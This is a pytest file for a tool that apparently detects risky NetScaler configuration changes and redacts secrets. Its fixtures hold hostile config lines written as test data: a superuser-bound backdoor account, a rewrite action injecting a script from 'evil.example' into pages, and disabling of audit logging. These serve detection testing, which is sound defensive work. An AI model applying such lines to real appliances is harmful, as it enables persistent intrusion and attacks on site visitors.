import pytest
from hypothesis import given
from hypothesis import strategies as st

from netrescale.detect.config_diff import diff_configs
from netrescale.detect.config_risk import load_risk_rules
from netrescale.detect.severity import Severity
from netrescale.parse.nsconf import (
    NsConfParseError,
    config_lines,
    parse_command,
    redact_line,
    tokenize,
    unquote,
)

RULES = load_risk_rules()

BASE = """\
#NS14.1 Build 73.37
# Last modified by `save config`, Mon Oct 05 10:00:00 2026
set ns config -IPAddress 10.0.0.10 -netmask 255.255.255.0
set ns hostName ns-gw-01
add HA node 1 10.0.0.11
set ns rpcNode 10.0.0.10 -password 8a7f0c1d2e3b4a5f6e7d8c9b0a1f2e3d -encrypted -encryptmethod ENCMTHD_3 -kek -suffix 2026_01_01_00_00_00
add system user nr_nitro 5b3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b -encrypted -hashmethod SHA512 -allowedManagementInterface API
add authentication ldapAction ldap1 -serverIP 10.0.0.5 -ldapBase "dc=corp,dc=example" -ldapBindDn svc@corp -ldapBindDnPassword 0f1e2d3c4b5a69788796a5b4c3d2e1f0 -encrypted -encryptmethod ENCMTHD_3
add snmp community s3cr3tcommunity ALL
add lb vserver web_vs HTTP 10.0.1.10 80 -persistenceType NONE
bind lb vserver web_vs web_svc1
add audit syslogAction nr_syslog 10.0.0.50 -serverPort 514 -transport TCP -logLevel ALL
"""


def test_tokenize_quotes_and_qstrings() -> None:
    line = 'add rewrite action a1 insert_after "HTTP.REQ.URL.CONTAINS(\\"x y\\")" q{a b "c"} -x'
    toks = tokenize(line)
    assert toks == ["add", "rewrite", "action", "a1", "insert_after",
                    '"HTTP.REQ.URL.CONTAINS(\\"x y\\")"', 'q{a b "c"}', "-x"]
    assert unquote(toks[5]) == 'HTTP.REQ.URL.CONTAINS("x y")'
    assert unquote(toks[6]) == 'a b "c"'


def test_tokenize_q_is_not_a_quote_in_words() -> None:
    assert tokenize("set ns param -quiet YES") == ["set", "ns", "param", "-quiet", "YES"]


def test_unterminated_quote() -> None:
    with pytest.raises(NsConfParseError):
        tokenize('add x y "oops')


def test_parse_command_structure() -> None:
    c = parse_command("add system user nr_nitro HASH -encrypted -hashmethod SHA512")
    assert c is not None
    assert (c.verb, c.object, c.name) == ("add", "system user", "nr_nitro")
    assert c.positional == ("HASH",)
    assert c.option("hashMethod") == ("SHA512",)
    assert c.option("encrypted") == ()

    r = parse_command("add route 0.0.0.0 0.0.0.0 10.0.0.1")
    assert r is not None and (r.object, r.name) == ("route", "0.0.0.0")

    assert parse_command("# comment") is None
    assert parse_command("   ") is None


def test_redaction_hides_secrets_but_keeps_change_visible() -> None:
    red = "\n".join(config_lines(BASE))
    for secret in ["8a7f0c1d2e3b4a5f6e7d8c9b0a1f2e3d", "5b3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b",
                   "0f1e2d3c4b5a69788796a5b4c3d2e1f0", "s3cr3tcommunity"]:
        assert secret not in red
    assert "<redacted:" in red
    assert "nr_nitro" in red and "10.0.0.5" in red and "ENCMTHD_3" in red
    # same secret -> same fingerprint; different secret -> different fingerprint
    a = redact_line("set ns rpcNode 1.1.1.1 -password aaaaaaaaaaaaaaaaaaaa -encrypted")
    b = redact_line("set ns rpcNode 1.1.1.1 -password aaaaaaaaaaaaaaaaaaaa -encrypted")
    c = redact_line("set ns rpcNode 1.1.1.1 -password bbbbbbbbbbbbbbbbbbbb -encrypted")
    assert a == b != c


def test_comment_only_change_is_not_a_change() -> None:
    other = BASE.replace("Mon Oct 05 10:00:00 2026", "Tue Oct 06 11:00:00 2026")
    assert diff_configs(BASE, other, RULES).empty


def test_reordering_is_not_a_change() -> None:
    lines = BASE.splitlines()
    assert diff_configs(BASE, "\n".join(reversed(lines)), RULES).empty


def test_backdoor_user_is_critical() -> None:
    new = BASE + "add system user backdoor 0123456789abcdef0123 -encrypted -hashmethod SHA512\n" \
                 "bind system user backdoor superuser 0\n"
    d = diff_configs(BASE, new, RULES)
    assert d.max_severity is Severity.CRITICAL
    assert {c.op for c in d.changes} == {"added"}
    assert "0123456789abcdef0123" not in d.render()


def test_password_change_detected_as_modified_without_leaking() -> None:
    new = BASE.replace("5b3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b",
                       "ffffffffffffffffffffffffffffffffffffffff")
    d = diff_configs(BASE, new, RULES)
    assert len(d.changes) == 1
    ch = d.changes[0]
    assert ch.op == "modified" and ch.object == "system user"
    assert ch.severity is Severity.CRITICAL
    assert "ffffffff" not in d.render()


def test_logging_removed_is_critical() -> None:
    new = BASE.replace("add audit syslogAction nr_syslog 10.0.0.50 -serverPort 514 "
                       "-transport TCP -logLevel ALL\n", "")
    d = diff_configs(BASE, new, RULES)
    assert d.changes[0].op == "removed"
    assert d.max_severity >= Severity.HIGH


def test_script_injection_is_critical() -> None:
    new = BASE + ('add rewrite action rw_x insert_before "HTTP.RES.BODY(1000)" '
                  'q{"<script src=https://evil.example/x.js></script>"}\n')
    d = diff_configs(BASE, new, RULES)
    assert d.max_severity is Severity.CRITICAL
    assert "page-injection" in d.changes[0].rule_ids


def test_unmatched_change_gets_default() -> None:
    new = BASE.replace("-persistenceType NONE", "-persistenceType SOURCEIP")
    d = diff_configs(BASE, new, RULES)
    assert d.changes[0].op == "modified" and d.changes[0].severity is Severity.LOW


def test_forensic_summary_highlights_critical_shift_types() -> None:
    new = BASE + (
        "add system user backdoor 0123456789abcdef0123 -encrypted -hashmethod SHA512\n"
        "bind system user backdoor superuser 0\n"
        "add rewrite action rw_x insert_before \"HTTP.RES.BODY(1000)\" "
        "q{\"<script src=https://evil.example/x.js></script>\"}\n"
        "set audit syslogParams -logLevel NONE\n"
    )
    d = diff_configs(BASE, new, RULES)
    summary = d.summarize().lower()
    assert "management users" in summary
    assert "privileged policy grants" in summary
    assert "rewrite/script-injection" in summary
    assert "audit logging tampering" in summary


def test_bind_changes_are_not_paired() -> None:
    new = BASE.replace("bind lb vserver web_vs web_svc1", "bind lb vserver web_vs web_svc2")
    assert sorted(c.op for c in diff_configs(BASE, new, RULES).changes) == ["added", "removed"]


def test_peer_compare_ignores_node_specific_lines() -> None:
    peer = (BASE.replace("10.0.0.10 -netmask", "10.0.0.11 -netmask")
                .replace("ns-gw-01", "ns-gw-02")
                .replace("add HA node 1 10.0.0.11", "add HA node 1 10.0.0.10"))
    assert diff_configs(BASE, peer, RULES, for_peer_compare=True).empty
    assert not diff_configs(BASE, peer, RULES).empty


@pytest.mark.parametrize(
    ("rule_id", "line"),
    [(r.id, t) for r in RULES.rules for t in r.tests],
)
def test_risk_rule_vectors(rule_id: str, line: str) -> None:
    cmd = parse_command(line)
    assert cmd is not None
    assert rule_id in {r.id for r in RULES.classify(cmd, "added")}, line


def test_every_risk_rule_has_a_vector() -> None:
    assert [r.id for r in RULES.rules if not r.tests] == []


_word = st.text(alphabet=st.characters(categories=["L", "N"], include_characters="_.-"),
                min_size=1, max_size=12).filter(lambda s: not s.startswith(("-", "q", "#")))
_quoted = st.text(alphabet=st.characters(blacklist_characters='"\\\n\r', categories=["L", "N",
                  "P", "Zs"]), max_size=20).map(lambda s: f'"{s}"')


@given(st.lists(st.one_of(_word, _quoted), min_size=1, max_size=10))
def test_tokenize_roundtrip(parts: list[str]) -> None:
    assert tokenize(" ".join(parts)) == parts
